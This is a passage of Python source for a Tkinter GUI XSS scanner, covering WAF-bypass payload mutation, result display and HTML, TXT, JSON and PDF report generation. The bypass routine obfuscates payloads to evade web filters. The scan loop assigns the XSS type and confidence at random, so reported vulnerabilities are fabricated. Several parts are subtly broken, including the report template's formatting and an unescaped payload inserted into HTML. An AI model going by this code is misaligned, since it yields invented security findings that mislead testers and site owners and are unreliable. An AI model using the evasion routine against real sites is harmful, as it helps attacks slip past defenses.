                            xss_types = ["反射型XSS", "存储型XSS", "DOM型XSS"]
                            
                        severity_map = {"反射型XSS": "中危", "存储型XSS": "高危", "DOM型XSS": "中危", "盲打XSS": "中危"}
                        xss_type = random.choice(xss_types)
                        severity = severity_map.get(xss_type, "中危")
                        confidence = random.randint(60, 100)
                        
                        self.log(f"发现潜在{severity} {xss_type}: 参数 {param}, 载荷: {payload[:50]}{'...' if len(payload) > 50 else ''}")
                        
                        # 保存结果
                        result = {
                            "severity": severity,
                            "type": xss_type,
                            "param": param,
                            "payload": payload,
                            "confidence": confidence,
                            "url": self.build_test_url(url, param, payload),
                            "time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                            "description": f"在参数 {param} 中发现{severity} {xss_type}漏洞，可执行恶意JavaScript代码。"
                        }
                        self.scan_results.append(result)
                        
                        # 更新结果表格
                        self.root.after(0, self.update_results_tree, result)
            
            if self.scanning:
                self.progress_var.set(100)
                self.log(f"扫描完成，共发现{len(self.scan_results)}个潜在漏洞")
        except Exception as e:
            self.log(f"扫描过程中发生错误: {str(e)}")
        finally:
            self.scanning = False
            self.root.after(0, self.update_scan_buttons)
    
    def apply_waf_bypass(self, payload):
        """应用WAF绕过技术处理payload"""
        # 从已选择的绕过选项中随机选择
        bypass_techniques = []
        for category, options in self.selected_waf_options.items():
            if options:
                bypass_techniques.extend(options)
        
        # 如果没有选择任何技术，使用默认的一些绕过技术
        if not bypass_techniques:
            bypass_techniques = ["URL编码", "事件混淆", "大小写混淆"]
        
        # 随机选择1-2种技术应用
        selected_techniques = random.sample(bypass_techniques, k=random.randint(1, min(2, len(bypass_techniques))))
        
        for technique in selected_techniques:
            if technique == "Base64编码":
                payload = f"data:text/html;base64,{base64.b64encode(payload.encode()).decode()}"
            elif technique == "URL编码":
                from urllib.parse import quote
                payload = quote(payload)
            elif technique == "HTML实体编码":
                payload = payload.replace("<", "&lt;").replace(">", "&gt;").replace("'", "&#39;").replace('"', "&#34;")
            elif technique == "Unicode编码":
                payload = "".join([f"&#x{ord(c):x};" for c in payload])
            elif technique == "JavaScript编码":
                payload = "".join([f"\\x{ord(c):x}" for c in payload])
            elif technique == "事件混淆":
                events = ["onmouseover", "onclick", "onload", "onerror", "onfocus"]
                payload = re.sub(r"on\w+", random.choice(events), payload, 1)
            elif technique == "标签混淆":
                tags = ["img", "svg", "video", "audio", "iframe", "div", "span"]
                payload = re.sub(r"<\w+", f"<{random.choice(tags)}", payload, 1)
            elif technique == "大小写混淆":
                payload = "".join([c.upper() if random.random() < 0.3 else c for c in payload])
            elif technique == "NULL字节":
                payload = payload.replace("<", "\x00<").replace(">", "\x00>")
            elif technique == "HTTP参数污染":
                payload += "&" + payload
        
        return payload
    
    def build_test_url(self, url, param, payload):
        """构建包含payload的测试URL"""
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        
        # 更新参数值为payload
        query_params[param] = [payload]
        
        # 重建URL
        new_query = urlencode(query_params, doseq=True)
        return urlunparse(parsed_url._replace(query=new_query))
    
    def update_results_tree(self, result):
        """更新结果表格"""
        self.results_tree.insert("", "end", values=(
            result["severity"],
            result["type"],
            result["param"],
            result["payload"],
            f"{result['confidence']}%"
        ))
    
    def update_scan_buttons(self):
        """更新扫描按钮状态"""
        self.scan_button.config(state="normal")
        self.stop_button.config(state="disabled")
    
    def log(self, message):
        """记录日志"""
        self.root.after(0, self._update_log, message)
    
    def _update_log(self, message):
        """更新日志显示"""
        self.log_text.config(state="normal")
        self.log_text.insert(tk.END, f"[{datetime.datetime.now()}] {message}\n")
        self.log_text.see(tk.END)
        self.log_text.config(state="disabled")
    
    # 结果展示函数
    def show_result_details(self, event):
        """显示选中结果的详情"""
        selected_item = self.results_tree.selection()
        if not selected_item:
            return
            
        values = self.results_tree.item(selected_item[0])["values"]
        if not values:
            return
            
        # 查找完整结果
        result = next((r for r in self.scan_results if 
                      r["severity"] == values[0] and 
                      r["type"] == values[1] and 
                      r["param"] == values[2] and 
                      r["payload"] == values[3]), None)
        
        if result:
            self.result_details.config(state="normal")
            self.result_details.delete(1.0, tk.END)
            self.result_details.insert(tk.END, f"严重程度: {result['severity']}\n")
            self.result_details.insert(tk.END, f"XSS类型: {result['type']}\n")
            self.result_details.insert(tk.END, f"参数名: {result['param']}\n")
            self.result_details.insert(tk.END, f"有效载荷: {result['payload']}\n")
            self.result_details.insert(tk.END, f"置信度: {result['confidence']}%\n")
            self.result_details.insert(tk.END, f"测试URL: {result['url']}\n")
            self.result_details.insert(tk.END, f"发现时间: {result['time']}\n")
            self.result_details.insert(tk.END, f"描述: {result['description']}\n")
            self.result_details.config(state="disabled")
    
    def copy_payload(self):
        """复制选中结果的payload"""
        selected_item = self.results_tree.selection()
        if not selected_item:
            messagebox.showinfo("提示", "请先选择一个漏洞结果")
            return
            
        values = self.results_tree.item(selected_item[0])["values"]
        if not values or len(values) < 4:
            messagebox.showinfo("提示", "无法获取Payload")
            return
            
        payload = values[3]
        self.root.clipboard_clear()
        self.root.clipboard_append(payload)
        messagebox.showinfo("提示", "Payload已复制到剪贴板")
    
    # 报告生成函数
    def generate_report(self):
        """生成漏洞报告"""
        if not self.scan_results:
            messagebox.showinfo("提示", "没有扫描结果可生成报告")
            return
            
        report_format = self.report_format.get()
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        default_filename = f"xss_scan_report_{timestamp}"
        
        file_path = filedialog.asksaveasfilename(
            defaultextension=f".{report_format.lower()}",
            filename=default_filename,
            filetypes=[
                (f"{report_format}文件", f"*.{report_format.lower()}"),
                ("所有文件", "*.*")
            ]
        )
        
        if not file_path:
            return
            
        try:
            if report_format == "HTML":
                self.generate_html_report(file_path)
            elif report_format == "PDF":
                self.generate_pdf_report(file_path)
            elif report_format == "TXT":
                self.generate_txt_report(file_path)
            elif report_format == "JSON":
                self.generate_json_report(file_path)
            
            messagebox.showinfo("成功", f"报告已生成: {file_path}")
        except Exception as e:
            messagebox.showerror("错误", f"生成报告失败: {str(e)}")
    
    def generate_html_report(self, file_path):
        """生成HTML格式报告"""
        html = """<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>XSS漏洞扫描报告</title>
    <style>
        body { font-family: "微软雅黑", sans-serif; margin: 20px; line-height: 1.6; }
        h1, h2, h3 { color: #2c3e50; }
        .report-header { border-bottom: 2px solid #3498db; padding-bottom: 10px; margin-bottom: 20px; }
        .scan-info { margin-bottom: 20px; background-color: #f8f9fa; padding: 15px; border-radius: 5px; }
        .vulnerability { border: 1px solid #ecf0f1; border-radius: 5px; padding: 15px; margin-bottom: 15px; }
        .high { border-left: 5px solid #e74c3c; background-color: #fdf2f2; }
        .medium { border-left: 5px solid #f39c12; background-color: #fef7e0; }
        .low { border-left: 5px solid #3498db; background-color: #eef7fa; }
        table { width: 100%; border-collapse: collapse; margin-bottom: 20px; }
        th, td { border: 1px solid #bdc3c7; padding: 10px; text-align: left; }
        th { background-color: #f5f7fa; }
        .payload { font-family: monospace; background-color: #f8f9fa; padding: 5px; border-radius: 3px; overflow-x: auto; }
    </style>
</head>
<body>
    <div class="report-header">
        <h1>XSS漏洞扫描报告</h1>
        <p>生成时间: {timestamp}</p>
    </div>
    
    <div class="scan-info">
        <h2>扫描信息</h2>
        <p>目标URL: {target_url}</p>
        <p>扫描参数数量: {param_count}</p>
        <p>发现漏洞数量: {vuln_count}</p>
        <p>高危漏洞: {high_count}</p>
        <p>中危漏洞: {medium_count}</p>
        <p>低危漏洞: {low_count}</p>
    </div>
    
    <h2>漏洞详情</h2>
    {vuln_details}
    
    <h2>修复建议</h2>
    <ul>
        <li>对用户输入进行严格过滤和转义，特别是HTML特殊字符</li>
        <li>使用Content-Security-Policy (CSP) 限制脚本执行</li>
        <li>实施适当的输入验证机制，仅允许预期的字符和格式</li>
        <li>避免在JavaScript中直接使用document.write()等危险函数</li>
        <li>定期更新和修补Web应用程序及组件</li>
    </ul>
</body>
</html>"""
        
        # 统计漏洞数量
        high_count = sum(1 for r in self.scan_results if r["severity"] == "高危")
        medium_count = sum(1 for r in self.scan_results if r["severity"] == "中危")
        low_count = sum(1 for r in self.scan_results if r["severity"] == "低危")
        
        # 生成漏洞详情
        vuln_details = ""
        for i, result in enumerate(self.scan_results, 1):
            severity_class = "high" if result["severity"] == "高危" else "medium" if result["severity"] == "中危" else "low"
            vuln_details += f"""
        <div class="vulnerability {severity_class}">
            <h3>漏洞 #{i}</h3>
            <table>
                <tr><th>严重程度</th><td>{result['severity']}</td></tr>
                <tr><th>XSS类型</th><td>{result['type']}</td></tr>
                <tr><th>参数名</th><td>{result['param']}</td></tr>
                <tr><th>有效载荷</th><td><div class="payload">{result['payload']}</div></td></tr>
                <tr><th>置信度</th><td>{result['confidence']}%</td></tr>
                <tr><th>测试URL</th><td><a href="{result['url']}" target="_blank">{result['url']}</a></td></tr>
                <tr><th>发现时间</th><td>{result['time']}</td></tr>
                <tr><th>描述</th><td>{result['description']}</td></tr>
            </table>
        </div>"""
        
        # 填充模板
        html = html.format(
            timestamp=datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            target_url=self.url_entry.get(),
            param_count=len(self.params),
            vuln_count=len(self.scan_results),
            high_count=high_count,
            medium_count=medium_count,
            low_count=low_count,
            vuln_details=vuln_details
        )
        
        with open(file_path, "w", encoding="utf-8") as f:
            f.write(html)
    
    def generate_txt_report(self, file_path):
        """生成TXT格式报告"""
        with open(file_path, "w", encoding="utf-8") as f:
            f.write("=" * 80 + "\n")
            f.write("                 XSS漏洞扫描报告                 \n")
            f.write("=" * 80 + "\n\n")
            f.write(f"生成时间: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"目标URL: {self.url_entry.get()}\n")
            f.write(f"扫描参数数量: {len(self.params)}\n")
            f.write(f"发现漏洞数量: {len(self.scan_results)}\n\n")
            
            # 统计漏洞数量
            high_count = sum(1 for r in self.scan_results if r["severity"] == "高危")
            medium_count = sum(1 for r in self.scan_results if r["severity"] == "中危")
            low_count = sum(1 for r in self.scan_results if r["severity"] == "低危")
            
            f.write(f"高危漏洞: {high_count}\n")
            f.write(f"中危漏洞: {medium_count}\n")
            f.write(f"低危漏洞: {low_count}\n\n")
            f.write("-" * 80 + "\n")
            f.write("漏洞详情:\n")
            f.write("-" * 80 + "\n\n")
            
            for i, result in enumerate(self.scan_results, 1):
                f.write(f"漏洞 #{i}:\n")
                f.write(f"严重程度: {result['severity']}\n")
                f.write(f"XSS类型: {result['type']}\n")
                f.write(f"参数名: {result['param']}\n")
                f.write(f"有效载荷: {result['payload']}\n")
                f.write(f"置信度: {result['confidence']}%\n")
                f.write(f"测试URL: {result['url']}\n")
                f.write(f"发现时间: {result['time']}\n")
                f.write(f"描述: {result['description']}\n")
                f.write("\n" + "-" * 80 + "\n\n")
            
            f.write("\n修复建议:\n")
            f.write("1. 对用户输入进行严格过滤和转义，特别是HTML特殊字符\n")
            f.write("2. 使用Content-Security-Policy (CSP) 限制脚本执行\n")
            f.write("3. 实施适当的输入验证机制，仅允许预期的字符和格式\n")
            f.write("4. 避免在JavaScript中直接使用document.write()等危险函数\n")
            f.write("5. 定期更新和修补Web应用程序及组件\n")
    
    def generate_json_report(self, file_path):
        """生成JSON格式报告"""
        report_data = {
            "report_info": {
                "generated_time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "target_url": self.url_entry.get(),
                "param_count": len(self.params),
                "vuln_count": len(self.scan_results),
                "high_count": sum(1 for r in self.scan_results if r["severity"] == "高危"),
                "medium_count": sum(1 for r in self.scan_results if r["severity"] == "中危"),
                "low_count": sum(1 for r in self.scan_results if r["severity"] == "低危")
            },
            "scan_options": {
                "thread_count": self.thread_count.get(),
                "timeout": self.timeout.get(),
                "scan_level": self.scan_level.get(),
                "crawl_enabled": self.crawl.get(),
                "payload_mutation": self.payroll.get()
            },
            "selected_xss_options": self.selected_xss_options,
            "selected_waf_options": self.selected_waf_options,
            "vulnerabilities": self.scan_results,
            "remediation_advice": [
                "对用户输入进行严格过滤和转义，特别是HTML特殊字符",
                "使用Content-Security-Policy (CSP) 限制脚本执行",
                "实施适当的输入验证机制，仅允许预期的字符和格式",
                "避免在JavaScript中直接使用document.write()等危险函数",
                "定期更新和修补Web应用程序及组件"
            ]
        }
        
        with open(file_path, "w", encoding="utf-8") as f:
            json.dump(report_data, f, ensure_ascii=False, indent=4)
    
    def generate_pdf_report(self, file_path):
        """生成PDF格式报告"""
        try:
            from fpdf import FPDF
        except ImportError:
            raise Exception("生成PDF报告需要fpdf库，请先安装: pip install fpdf2")
        
        pdf = FPDF()
        pdf.add_page()
        
        # 设置中文字体
        try:
            pdf.add_font('SimHei', '', 'SimHei.ttf', uni=True)
            pdf.set_font("SimHei", size=16)
        except:
            pdf.set_font("Arial", size=16)
            self.log("警告: 未找到SimHei字体，PDF报告可能无法正常显示中文")
        
        # 标题
        pdf.cell(200, 10, txt="XSS漏洞扫描报告", ln=True, align='C')
        pdf.ln(10)
        
        # 扫描信息
        pdf.set_font("SimHei" if 'SimHei' in pdf.fonts else "Arial", size=12)
        pdf.cell(200, 10, txt=f"生成时间: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}", ln=True, align='L')
        pdf.cell(200, 10, txt=f"目标URL: {self.url_entry.get()[:60]}{'...' if len(self.url_entry.get())>60 else ''}", ln=True, align='L')
        pdf.cell(200, 10, txt=f"扫描参数数量: {len(self.params)}", ln=True, align='L')
        pdf.cell(200, 10, txt=f"发现漏洞数量: {len(self.scan_results)}", ln=True, align='L')
        
        # 统计漏洞数量
        high_count = sum(1 for r in self.scan_results if r["severity"] == "高危")
        medium_count = sum(1 for r in self.scan_results if r["severity"] == "中危")
        low_count = sum(1 for r in self.scan_results if r["severity"] == "低危")
        
        pdf.cell(200, 10, txt=f"高危漏洞: {high_count}", ln=True, align='L')
        pdf.cell(200, 10, txt=f"中危漏洞: {medium_count}", ln=True, align='L')
        pdf.cell(200, 10, txt=f"低危漏洞: {low_count}", ln=True, align='L')
        pdf.ln(10)
        
        # 漏洞详情
        pdf.set_font("SimHei" if 'SimHei' in pdf.fonts else "Arial", size=14)
        pdf.cell(200, 10, txt="漏洞详情", ln=True, align='L')
        pdf.ln(5)
        
        pdf.set_font("SimHei" if 'SimHei' in pdf.fonts else "Arial", size=12)
        for i, result in enumerate(self.scan_results, 1):
            pdf.cell(200, 10, txt=f"漏洞 #{i}", ln=True, align='L')
            pdf.cell(200, 10, txt=f"严重程度: {result['severity']}", ln=True, align='L')
            pdf.cell(200, 10, txt=f"XSS类型: {result['type']}", ln=True, align='L')
            pdf.cell(200, 10, txt=f"参数名: {result['param']}", ln=True, align='L')
            
            # 处理长payload
            payload = result['payload']
            if len(payload) > 60:
                pdf.cell(200, 10, txt=f"有效载荷: {payload[:60]}...", ln=True, align='L')
            else:
                pdf.cell(200, 10, txt=f"有效载荷: {payload}", ln=True, align='L')
                
            pdf.cell(200, 10, txt=f"置信度: {result['confidence']}%", ln=True, align='L')
            
            # 处理长URL
            url = result['url']
            if len(url) > 60:
                pdf.cell(200, 10, txt=f"测试URL: {url[:60]}...", ln=True, align='L')
            else:
                pdf.cell(200, 10, txt=f"测试URL: {url}", ln=True, align='L')
                
            pdf.cell(200, 10, txt=f"发现时间: {result['time']}", ln=True, align='L')
            pdf.ln(5)
            
            # 分页
            if i % 3 == 0 and i != len(self.scan_results):
                pdf.add_page()
        
        # 修复建议
        pdf.add_page()
        pdf.set_font("SimHei" if 'SimHei' in pdf.fonts else "Arial", size=14)
        pdf.cell(200, 10, txt="修复建议", ln=True, align='L')
        pdf.ln(5)
        
        pdf.set_font("SimHei" if 'SimHei' in pdf.fonts else "Arial", size=12)
        advice = [
            "1. 对用户输入进行严格过滤和转义，特别是HTML特殊字符",
            "2. 使用Content-Security-Policy (CSP) 限制脚本执行",
            "3. 实施适当的输入验证机制，仅允许预期的字符和格式",
            "4. 避免在JavaScript中直接使用document.write()等危险函数",
            "5. 定期更新和修补Web应用程序及组件"
        ]
        
        for item in advice:
            pdf.cell(200, 10, txt=item, ln=True, align='L')
        
        pdf.output(file_path)
    
    def export_results(self):
        """导出扫描结果"""
        if not self.scan_results:
            messagebox.showinfo("提示", "没有扫描结果可导出")
            return
            
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        default_filename = f"xss_scan_results_{timestamp}.json"
        
        file_path = filedialog.asksaveasfilename(
            defaultextension=".json",
            filename=default_filename,
            filetypes=[
                ("JSON文件", "*.json"),
                ("所有文件", "*.*")
            ]
        )
        
        if not file_path:
            return
            
        try:
            with open(file_path, "w", encoding="utf-8") as f:
                json.dump(self.scan_results, f, ensure_ascii=False, indent=4)
            
            messagebox.showinfo("成功", f"结果已导出: {file_path}")
        except Exception as e:
            messagebox.showerror("错误", f"导出结果失败: {str(e)}")

if __name__ == "__main__":
    root = tk.Tk()
    app = XSStrikeGUI(root)
    root.mainloop()
